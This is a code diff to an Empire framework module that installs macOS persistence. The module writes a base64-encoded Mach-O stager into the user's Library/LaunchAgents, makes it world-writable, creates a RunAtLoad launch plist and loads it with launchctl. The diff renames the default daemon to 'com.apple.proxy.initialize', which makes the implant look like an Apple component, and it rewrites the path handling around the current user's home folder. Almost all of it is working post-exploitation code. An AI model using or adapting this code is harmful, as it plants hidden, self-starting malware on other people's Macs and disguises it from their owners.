@@ -65,12 +65,12 @@ class Module:
             'DaemonName' : {
                 'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                 'Required'      :   True,
-                'Value'         :   'com.proxy.initialize'
+                'Value'         :   'com.apple.proxy.initialize'
             },
             'DaemonPath' : {
-                'Description'   :   'The full path of where the Empire launch daemon should be located (e.g. /Users/{userid}/Library/LaunchAgents/)',
+                'Description'   :   'The relative path of where the Empire launch daemon should be located.',
                 'Required'      :   True,
-                'Value'         :   ''
+                'Value'         :   'Library/LaunchAgents/'
             }
         }
 
@@ -103,45 +103,50 @@ class Module:
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
 
-        plistSettings = """
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
-<plist version="1.0">
-<dict>
-    <key>Label</key>
-    <string>%s</string>
-    <key>Program</key>
-    <string>%s</string>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>
-""" % (daemonName, (daemonPath + daemonName))
-
         script = """
 import subprocess
 import sys
 import base64
 import os
 
+my_env = os.environ.copy()
+username = my_env["USER"]
+
 encBytes = "%s"
 bytes = base64.b64decode(encBytes)
-plist = \"\"\"
-%s
-\"\"\"
 daemonPath = "%s"
 daemonName = "%s"
+fullPath = "/Users/" + username + "/" + daemonPath
 
-if not os.path.exists(daemonPath):
-    os.makedirs(daemonPath)
+plist = \"\"\"
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>||daemonName||</string>
+    <key>Program</key>
+    <string>||fullPath||||daemonName||</string>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+\"\"\"
+
+plist = plist.replace("||daemonName||", daemonName)
+plist = plist.replace("||fullPath||", fullPath)
 
 
-e = open(daemonPath + daemonName,'wb')
+if not os.path.exists(fullPath):
+    os.makedirs(fullPath)
+
+
+e = open(fullPath + daemonName,'wb')
 e.write(bytes)
 e.close()
 
-os.chmod(daemonPath + daemonName, 0777)
-plistFilename = daemonPath + daemonName + ".plist"
+os.chmod(fullPath + daemonName, 0777)
+plistFilename = fullPath + daemonName + ".plist"
 
 f = open(plistFilename,'w')
 f.write(plist)
@@ -163,8 +168,8 @@ process = subprocess.Popen('launchctl load ' + plistFilename, stdout=subprocess.
 process.communicate()
 
 print "\\n[+] Persistence has been installed: " + plistFilename
-print "\\n[+] Empire daemon has been written to " + daemonPath
+print "\\n[+] Empire daemon has been written to " + fullPath
 
-""" % (encBytes, plistSettings, daemonPath, daemonName)
+""" % (encBytes, daemonPath, daemonName)
 
         return script
